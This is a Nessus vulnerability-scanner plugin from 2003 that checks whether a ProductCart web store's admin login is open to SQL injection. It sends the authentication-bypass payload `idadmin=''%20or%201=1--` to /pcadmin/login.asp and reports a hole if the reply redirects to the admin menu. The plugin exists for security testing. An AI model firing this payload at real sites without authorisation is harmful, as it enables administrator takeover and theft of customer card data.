# 
# (C) Tenable Network Security
#

if (description)
{
 script_id(11785);
 script_bugtraq_id(8103, 8105, 8108, 8112);
 script_version ("$Revision: 1.1 $");

 script_name(english:"ProductCart SQL Injection");
 desc["english"] = "
The remote host is using the ProductCart software suite.

This set of CGIs is vulnerable to a SQL injection bug which may allow 
an attacker to take the control of the server as an administrator.
From there, he can obtain the list of customers, steal their credit
card information and more.

In addition to this, this software is vulnerable to various
file disclosure and cross site scripting flaws.

Solution : Upgrade to the latest version of ProductCart 
Risk factor : High";

 script_description(english:desc["english"]);
 script_summary(english:"Determine if ProductCart is vulnerable to a sql injection attack");
 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_kb_item("Services/www");
if(!port)port = 80;
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = http_get(item:dir + "/pcadmin/login.asp?idadmin=''%20or%201=1--", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 
 if(egrep(pattern:"^Location: menu\.asp", string:res))
 {
  security_hole(port);
  exit(0);
 }
}
